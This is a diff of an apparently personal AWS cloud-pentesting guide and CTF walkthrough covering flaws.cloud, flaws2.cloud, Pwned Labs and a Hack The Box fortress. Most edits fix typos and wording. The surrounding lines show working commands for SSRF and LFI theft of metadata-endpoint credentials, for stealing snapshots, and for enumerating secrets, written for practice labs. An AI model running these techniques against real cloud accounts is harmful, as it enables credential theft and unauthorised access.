@@ -118,7 +118,7 @@ Similar to other types of penetration testing, the scoping process should includ
 * How many IAM policies are assigned?
 * How many accounts exist?
 
-Keep the **Shared Responsibility Model** in mind: security of the cloud is AWS's responsiblity, security in the cloud is the customer's responsibility
+Keep the **Shared Responsibility Model** in mind: security of the cloud is AWS's responsibility, security in the cloud is the customer's responsibility
 
 Remember AWS's <a href="https://aws.amazon.com/security/penetration-testing/">policy for penetration testing</a>
 
@@ -142,7 +142,7 @@ A few **AWS-specific reconnaissance techniques**:
 
 Regarding the **local filesystem**, other tasks besides the usual non-cloud checks are:
 * Discovery of AWS Access Credentials in home directories and application files
-* Verifying access to the **AWS metadata enpoint** at `https://169.254.169.254/` or `http://[fd00:ec2::254]`
+* Verifying access to the **AWS metadata endpoint** at `https://169.254.169.254/` or `http://[fd00:ec2::254]`
 
 <br>
 
@@ -152,7 +152,7 @@ Credentials can be requested via the **AWS metadata service** (see above), which
 * **iam/info**, containing information about associated IAM roles
 * **iam/security-credentials/role-name**, containing temporary security credentials associated with the role
 
-If **Metadata Service Version 2 (IMDSv2)** is used, a token must be crafted. This prevents simple SSRF attacks. But if a user is compromised, you might be able to request an API token from the metadata service 
+If **Metadata Service Version 2 (IMDSv2)** is used, a token must be crafted. This prevents simple SSRF attacks, but if a user is compromised, you might be able to request an API token from the metadata service 
 ```
 [www-data@manager ~]$ TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
 
@@ -246,46 +246,46 @@ Time to **escalate privileges**. An attack path with these privileges is to firs
 ```
 [www-data@manager ~]$ aws ec2 describe-volumes
 {
-    “Volumes”: [
+    "Volumes": [
         {
-            “AvailabilityZone”: “eu-central-1a”, 
-            “Attachments”: [
+            "AvailabilityZone": "eu-central-1a", 
+            "Attachments": [
                 {
-                    “AttachTime”: “2023-02-21T06:58:45.000Z”, 
-                    “InstanceId”: “i-067fa056e678575c6”, 
-                    “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
-                    “State”: “attached”, 
-                    “DeleteOnTermination”: true, 
-                    “Device”: “/dev/xvda”
+                    "AttachTime": "2023-02-21T06:58:45.000Z", 
+                    "InstanceId": "i-067fa056e678575c6", 
+                    "VolumeId": "vol-02ca4df63c5cbb8c5", 
+                    "State": "attached", 
+                    "DeleteOnTermination": true, 
+                    "Device": "/dev/xvda"
                 }
             ], 
-            “Encrypted”: false, 
-            “VolumeType”: “gp2”, 
-            “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
-            “State”: “in-use”, 
-            “Iops”: 100, 
-            “SnapshotId”: “snap-01c4670c36a9740ea”, 
-            “CreateTime”: “2023-02-21T06:58:45.361Z”, 
-            “MultiAttachEnabled”: false, 
-            “Size”: 8
+            "Encrypted": false, 
+            "VolumeType": "gp2", 
+            "VolumeId": "vol-02ca4df63c5cbb8c5", 
+            "State": "in-use", 
+            "Iops": 100, 
+            "SnapshotId": "snap-01c4670c36a9740ea", 
+            "CreateTime": "2023-02-21T06:58:45.361Z", 
+            "MultiAttachEnabled": false, 
+            "Size": 8
         }
     ]
 }
 ```
 Note the `VolumeID` to create a snapshot of it later
 ```
-[www-data@manager ~]$ aws ec2 create-snapshot –volume-id vol-02ca4df63c5cbb8c5 –description ‘Y-Security rocks!’
+[www-data@manager ~]$ aws ec2 create-snapshot --volume-id vol-02ca4df63c5cbb8c5 --description 'Y-Security rocks!'
 {
-    “Description”: “Y-Security rocks!”, 
-    “Tags”: [], 
-    “Encrypted”: false, 
-    “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
-    “State”: “pending”, 
-    “VolumeSize”: 8, 
-    “StartTime”: “2023-02-21T10:40:05.770Z”, 
-    “Progress”: “”, 
-    “OwnerId”: “124253853813”, 
-    “SnapshotId”: “snap-06eedc6a7403eda54”
+    "Description": "Y-Security rocks!", 
+    "Tags": [], 
+    "Encrypted": false, 
+    "VolumeId": "vol-02ca4df63c5cbb8c5", 
+    "State": "pending", 
+    "VolumeSize": 8, 
+    "StartTime": "2023-02-21T10:40:05.770Z", 
+    "Progress": "", 
+    "OwnerId": "124253853813", 
+    "SnapshotId": "snap-06eedc6a7403eda54"
 }
 ```
 
@@ -339,7 +339,7 @@ WjGvoMRN0a/mxpqX1WyPDEuwNoT547VnXNo2fKsZjsvqmjMGg5wFh4ERhFczb6gg
 # CTFs and hands-on material
 ## flaws.cloud
 
-This one was great. Simple, minimal setup and slowly introduces each concept. You'll learn so much from such small challenges! Definitely worth your time 
+This one was great. Simple, minimal setup, and slowly introduces each concept. You'll learn so much from such small challenges! Definitely worth your time 
 
 ```
 Scope: Everything is run out of a single AWS account, and all challenges are sub-domains of flaws.cloud.
@@ -367,7 +367,7 @@ Address: 52.92.152.19
 19.152.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
 ```
 
-And trying to list files inside the S3 bucket. Note how to `--no-sign-request` signals we're trying to access the bucket as an anonymous user
+And when trying to list files inside the S3 bucket, note how to `--no-sign-request` signals we're trying to access the bucket as an anonymous user
 ```
 ┌──(kali㉿kali)-[~]
 └─$ aws s3 ls flaws.cloud                             
@@ -429,7 +429,7 @@ Address: 52.92.164.11
 
 But anonymous access doesn't work like before. This will require setting up an AWS account and configuring the credentials with the `aws configure` command. This should be more or less straight forward
 
-I did run into a problem - `An error occurred (SignatureDoesNotMatch) when calling the GetCallerIdentity operation` - which I believe is related to my Kali's messed up timezone. I play a lot of CTFs and sometimes I have to synchronize my clock with different Kerberos servers. I solved this with `sudo timedatectl set-ntp true`
+I ran into a problem - `An error occurred (SignatureDoesNotMatch) when calling the GetCallerIdentity operation` - which I believe is related to my Kali's incorrect timezone. I play a lot of CTFs and sometimes need to synchronize my clock with different Kerberos servers. I solved this with `sudo timedatectl set-ntp true`
 
 Anyway, after setting up the credentials, the same command will work since it automatically assumes the AWS profile
 
@@ -485,7 +485,7 @@ Name:   level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
 └─$ nslookup 52.92.238.91                                       
 91.238.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
 ```
-And listing the files works again. Note how this is a git directory
+Listing the files works again. Note how this is a Git directory
 ```
 ┌──(kali㉿kali)-[~/.aws]
 └─$ aws s3 ls level3-9afd3927f195e10225021a578e6f78df.flaws.cloud 
@@ -582,7 +582,7 @@ Obviously hacker-me immediately tried browsing to levels 5 and 6, but that won't
 For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
 It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.
 ```
-Sounds like we'll be stealing and loading someone else's snapshot.
+Sounds like we'll be stealing and loading someone else's snapshot
 First gathering some information about the bucket and the hijacked user
 ```
 ┌──(kali㉿kali)-[~/Desktop/bucket]
@@ -598,7 +598,7 @@ ec2-54-202-228-246.us-west-2.compute.amazonaws.com has address 54.202.228.246
     "Arn": "arn:aws:iam::975426262029:user/backup"
 }
 ```
-With the region and the user ID, it's now possible to call `ec2 describe-snapshot`. The next command shows how anyone can create volumes from this snapshot. In other words, the snapshot is public
+With the region and user ID, it's now possible to call `ec2 describe-snapshot`. The next command shows how anyone can create volumes from this snapshot, in other words, it is public
 ```
 ┌──(kali㉿kali)-[~/Desktop/bucket]
 └─$ aws ec2 describe-snapshots --profile pwned --owner-id 975426262029 --region us-west-2         
@@ -703,7 +703,7 @@ http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.co
 http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/
 See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it.
 ```
-This is basically a free SSRF, so let's try going for EC2 metadata 
+This is basically a free SSRF, let's try acessing the EC2 metadata 
 ```
 ┌──(kali㉿kali)-[~]
 └─$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/
@@ -778,7 +778,7 @@ Starting with basic enumeration, we check our identity and our permissions
     ]
 }
 ```
-To enumerate the policies, use the combination of these two commands. For each of them, list their policy versions and then go deeper with `get-policy-version` for each version. Obviously replace the policy-arn, version-id and profile as desired
+To enumerate the policies, use the following two commands. For each of them, list its versions, then use `get-policy-version` for each. Replace the policy ARN,verions ID, and profile as needed
 ```
 aws --profile SecurityAudit iam list-policy-versions --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
 aws --profile SecurityAudit iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
@@ -841,28 +841,28 @@ So the full URL is going to be `https://s33ppypa75.execute-api.us-west-2.amazona
 
 ## flaws2.cloud (attacker path)
 
-Same as the first flaws, definitely worth your time. Unfortunately there are less levels, but on the other hand it looks a bit more realistic with the combination of web and cloud hacking
+Same as the first flaws, definitely worth your time. Unfortunately there are fewer levels, but it feels a bit more realistic since it combines both web and cloud hacking
 
 ### Level 1
 
-Seems to start off as a web challenge, cool! Let's fire up burp
+Seems to start off as a web challenge, cool! Let's fire up Burp Suite
 
 <p align="center">
   <img width="50%" src="https://github.com/user-attachments/assets/073f62a0-524b-4d7e-95e5-f2bea499b691" >
 </p>
 
-Simply intercept the request and send a string as the code in the GET parameter. The application will break and will leak AWS credentials
+Simply intercept the HTTP request and send a string as the code GET parameter value. The application will break and will leak AWS credentials
 
 
 <p align="center">
   <img width="50%" src="https://github.com/user-attachments/assets/bd80a0aa-0036-4944-9cc5-5b20424be41a" >
 </p>
 
-We add them to `~/.aws/credentials` check if they're valid...
+We add them to `~/.aws/credentials` and then check if they're valid...
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nano ~/.aws/credentials
-                                                                                                                                                                                                                                            
+                 
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws sts get-caller-identity                                            
 {
@@ -872,7 +872,7 @@ We add them to `~/.aws/credentials` check if they're valid...
 }
 ```
 
-They are! So let's try to list what's inside the bucket
+They are! So let's list what's inside the S3 bucket
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws s3 ls s3://level1.flaws2.cloud                                                
@@ -942,7 +942,7 @@ We can enumerate further by fetching the manifest of this container with
 <snip>
 ```
 
-We  can request a download URL for each layer with the following command. This required some trial and error until I found something useful
+Some registries expose layer download URLs, these can be used to fetch image layers without registry auth if the ECR is misconfigured or using a public storage endpoint
 ```
 ┌──(kali㉿kali)-[~]
 └─$ aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
@@ -952,7 +952,7 @@ We  can request a download URL for each layer with the following command. This r
 }
 ```
 
-Browsing to the URL will download the file which contains credentials
+Browsing to the URL will download the tarball, which contains credentials inside
 
 <p align="center">
   <img width="50%" src="https://github.com/user-attachments/assets/ef3ee4e6-8694-4ed0-8cac-ad2066161878" >
@@ -967,7 +967,7 @@ These creds work in the initial login form, and we find Level 3 at http://level3
 The container's webserver you got access to includes a simple proxy that can be access with: http://container.target.flaws2.cloud/proxy/http://flaws.cloud or http://container.target.flaws2.cloud/proxy/http://neverssl.com
 ```
 
-Once again this screams SSRF! AWS containers running on ECS usually have their credentials at `169.254.170.2/v2/credentials/GUID`, where GUID is a value disclosed in the environment variables. Using the proxy, we can exploit an LFI vulnerability
+Once again this screams SSRF! For ECS task credentials, the metadata endpoint is typically `http://169.254.170.2/v2/credentials/GUID`, where GUID is a value disclosed in the environment variables. Using the proxy, we can exploit an LFI vulnerability
 ```
 ┌──(kali㉿kali)-[~]
 └─$ curl http://container.target.flaws2.cloud/proxy/file:///proc/self/environ --output out.txt
@@ -1019,11 +1019,11 @@ And we get the final flag/URL at http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb
 
 ## pwnedlabs.io
 
-Most stuff here is paid, but the free labs are pretty good, I'd definitely recommend them. I filtered by Red Team, AWS and Free and completed them all. It goes a bit more in depth than both flaws.cloud and covers some other service-specific vulnerabilities, so go ahead and try them out! Sometimes you even get to combine cloud with web or infrastructure pentesting. They claim to be "Beginner" and "Foundational" level, but some of them aren't super obvious if you're just starting your journey. Each lab has a thorough walkthrough so I won't bother with that, but I'll still leave some scattered notes in this section whenever I come across something new 
+Most content here is paid, but the free labs are very good, I definitely recommend them. I filtered by Red Team, AWS and Free and completed them all. The labs go deeper than both flaws.cloud and cover additional service-specific vulnerabilities, so go ahead and try them out! Sometimes you even get to combine cloud with web or infrastructure pentesting. They claim to be "Beginner" and "Foundational" level, but some of them aren't super obvious if you're just starting your journey. Each lab includes a thorough walkthrough so I won't bother with that, but I'll still leave some scattered notes here whenever I come across something new 
 
 <br>
 
-With the ARN of the role under our control and the S3 bucket name, the account ID of the S3 bucket owner can be bruted forced. This can be useful to later enumerate IAM roles and users tied to that account, as well as any public EBS and RDS snapshots
+With the ARN of the role under our control and the S3 bucket name, the account ID of the S3 bucket owner can be bruted forced. This is useful to later enumerate IAM roles and users tied to that account, as well as any public EBS and RDS snapshots
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ s3-account-search arn:aws:iam::427648302155:role/LeakyBucket mega-big-tech
@@ -1034,7 +1034,7 @@ found: 10751350379
 found: 107513503799
 ```
 
-Easily find bucket regions with a curl
+Easily find bucket regions with a curl by checking the response headers
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ curl -I https://mega-big-tech.s3.amazonaws.com
@@ -1058,7 +1058,7 @@ You can copy S3 files to the local system without using a browser
 download: s3://dev.huge-logistics.com/shared/hl_migration_project.zip to ./hl_migration_project.zip
 ```
 
-Run <a href="https://github.com/shabarkin/aws-enumerator">aws-enumerator</a> to enumerate permissions against services
+Run <a href="https://github.com/shabarkin/aws-enumerator">aws-enumerator</a> to enumerate permissions across services
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws-enumerator enum -services all                                                                                                                
@@ -1076,7 +1076,7 @@ This tool also allows dumping permissions for a specific service
 ListSecrets
 ```
 
-To call secretsmanager to list secrets
+To list Secrets Manager secrets, use
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws secretsmanager list-secrets
@@ -1106,7 +1106,7 @@ And to get a specific secret
 }
 ```
 
-Cloudshell doesn't expose the real EC2 metadata IP, instead we can contact it via a local proxy. To get credentials from metadata, including the session token
+Cloudshell doesn't expose the real EC2 metadata IP, instead use the local proxy to reach the metadata service and retrieve credentials (including the session token)
 ```
 [cloudshell-user@ip-10-132-50-112 ~]$ curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60"
 or9vBtyYCFsO2IMHgKffq0Kdzwk/syyNOA5iJCx5BNM=
@@ -1140,7 +1140,7 @@ To list policies attached to a user
 }
 ```
 
-To get more info about it, this is useful to find the version
+To get more information and find the default version ID of the policy
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest
@@ -1241,7 +1241,7 @@ And to call that action
 
 --- 
 
-The syntax is very similar from service to service, so it's fairly easy to invoke an action after finding we have permission for it. Another example...
+AWS CLI syntax is very similar across services, so it's fairly easy to invoke an action after finding we have permission for it. Another example...
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Policy --version-id v4
@@ -1305,7 +1305,7 @@ The syntax is very similar from service to service, so it's fairly easy to invok
 download: s3://hl-it-admin/ssh_keys/ssh_keys_backup.zip to ./ssh_keys_backup.zip
 ```
 
-With access to SSH keys, EC2's describe instances can give a hint to where they can be used. Let's use Pacu's ec2__enum
+With access to SSH keys, EC2's describe instances can give a hint on where they can be used. Let's use Pacu's ec2__enum
 ```
 Pacu (contractor:contractor) > run ec2__enum
   Running module ec2__enum...
@@ -1333,7 +1333,7 @@ Automatically targeting regions:
 52.0.51.234
 ```
 
-After an nmap scan, 54.226.75.125 has port 5985 open (WinRM). With it-admin's launch key, request its password with
+After an nmap scan, the host 54.226.75.125 has port 5985 open (WinRM). With it-admin's launch key, request its password with
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws ec2 get-password-data --instance-id i-04cc1c2c7ec1af1b5 --priv-launch-key it-admin.pem
@@ -1405,7 +1405,7 @@ Another way of enumerating IAM permissions
 
 ---
 
-Enumerating EC2 launch templates. One interesting parameter is the user data script in base64
+Enumerating EC2 launch templates. Note how the user data script is base64-encoded
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws ec2 describe-launch-templates                                                     
@@ -1457,7 +1457,7 @@ Enumerating EC2 launch templates. One interesting parameter is the user data scr
 
 ---
 
-Use LFIs to steal AWS credentials from home folders. Check /etc/passwd for user enumeration first
+Use LFI vulnerabilities to steal AWS credentials from home folders. Check /etc/passwd for user enumeration first
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ curl --path-as-is -i -s -k -X $'GET' \
@@ -1507,7 +1507,7 @@ Example of listing files inside an S3 bucket recursively
 2023-08-12 15:09:34      18994 static/js/popper.min.js
 ```
 
-If you find an interesting file, check if version is enabled with curl by looking for the header x-amz-version-id
+If you find an interesting file, check for object versioning with curl by looking for the header x-amz-version-id
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ curl -I https://huge-logistics-dashboard.s3.eu-north-1.amazonaws.com/static/js/auth.js
@@ -1588,7 +1588,7 @@ List versions with the below command. Note the delete marker and also how the fi
 <snip>
 ```
 
-Download previous versions like this
+Download a specific version with
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws s3api get-object --bucket huge-logistics-dashboard --key 'static/js/auth.js' --version-id 'qgWpDiIwY05TGdUvTnGJSH49frH_7.yh' auth.js --no-sign-request                    
@@ -1635,7 +1635,7 @@ You can get an Account ID from an access key ID with
 
 ---
 
-Look for public snapshots of single RDS databases (no hits) or RDS database cluster instances and grep for the target account ID
+Search public snapshots of single RDS databases (no hits) or RDS database cluster instances and grep for the target account ID
 ```
 ┌──(kali㉿kali)-[~]
 └─$ aws rds describe-db-snapshots --snapshot-type public --include-public --region us-east-1 | grep 104506445608
@@ -1648,11 +1648,11 @@ Look for public snapshots of single RDS databases (no hits) or RDS database clus
 
 There's an `orders-private` database cluster. In the AWS Console select the appropriate region and browse to Aurora and RDS > Snapshots > Public to restore it. The UI should be intuitive enough. Select the new database and set up an EC2 connection
 
-If you don't know the database password after spinning up the EC2 instance, it's possible to modify it from the Databases menu. Install postgresql-client on it and access the database snapshot
+If you don't know the database password after spinning up the EC2 instance, you can modify it from the Databases menu. Install postgresql-client on it and access the database snapshot
 
 ---
 
-Knowing a Cognito identity pool ID, we can request an Identity ID if it is configured to support unauthenticated identities. With the Identity ID, request credentials for it
+If a Cognito identity pool allows unauthenticated identities, you can obtain an IdentityId and then request temporary AWS credentials for it
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws cognito-identity get-id --identity-pool-id us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 --no-sign
@@ -1794,7 +1794,7 @@ This functions is vulnerable to an SSRF vulnerability. Exploit it with an LFI to
 
 ---
 
-You can use <a href="https://hub.docker.com/">Docker Hub</a> to search for docker images related to the target
+Use <a href="https://hub.docker.com/">Docker Hub</a> to search for public docker images related to the target
 
 <p align="center">
   <img width="60%" src="https://github.com/user-attachments/assets/00e60925-8cff-474c-893d-6059df86f98f"/>
@@ -2067,7 +2067,7 @@ Use `GoAWSConsoleSpray` for credential spraying
 
 ---
 
-You can invoke functions without having special permissions, here we only have `ListFunctions`
+Some functions can be invoked even with limited permissions, here we only have `ListFunctions`
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws lambda invoke --function-name huge-logistics-stock out
@@ -2081,7 +2081,7 @@ You can invoke functions without having special permissions, here we only have `
 {"statusCode": 200, "body": "\"Invalid event parameter!\""}
 ```
 
-The parameter can be brute forced, Param Miner style. My script takes a hardcoded wordlist and only prints the output if it doesn't contain the "Invalid event parameter!" string
+The parameter can be brute forced, Param Miner style. My script takes a wordlist (hardcoded) and only prints the output if it doesn't contain the "Invalid event parameter!" string
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ python3 try.py
@@ -2089,7 +2089,7 @@ The parameter can be brute forced, Param Miner style. My script takes a hardcode
 {"statusCode": 500, "error": "Invalid trackingID, refer to queue"}
 ```
 
-We also have SQS permissions, this 
+We also have SQS permissions, this allows listing queues and receiving messages
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws sqs list-queues                                                                                
@@ -2186,9 +2186,9 @@ VELUS CORP.:e46fbfe64cf7e50be097005f2de8b227:3558615975963377
 
 ## Hack The Box Fortress: AWS
 
-I was super excited when I started this Fortress. After so many labs and exercises, this seemed like the final boss where I could combine everything I knew in one huge challenge. Unfortunately I didn't love this fortress, it felt a bit too CTFy at times and not very cloud focused. It's mostly web pentesting so I wouldn't recommend it if you're looking to practice cloud pentesting in specific. Don't get me wrong, Hack The Box is absolutely amazing, but my expectations were different for this fortress. I decided to keep it in this post anyway.
+I was super excited when I started this Fortress. After so many labs and exercises, it felt like the final boss where I could combine everything I knew into one big challenge. Unfortunately I didn't love this fortress, it felt a bit too CTFy at times and not very cloud focused. It's mostly web pentesting so I wouldn't recommend it if you're looking to practice cloud pentesting in specific. Don't get me wrong, Hack The Box is absolutely amazing, but I was expecting something different. Still, I decided to keep it in this post anyway.
 
-Due to Hack The Box's policy I cannot give you a walkthrough, but I still left a couple of cloud related notes here
+Due to Hack The Box's policy I cannot share a walkthrough. Either way I've included a couple of cloud related notes below
 
 You can set pass the endpoint URL programatically with the `--endpoint-url` flag
 ```
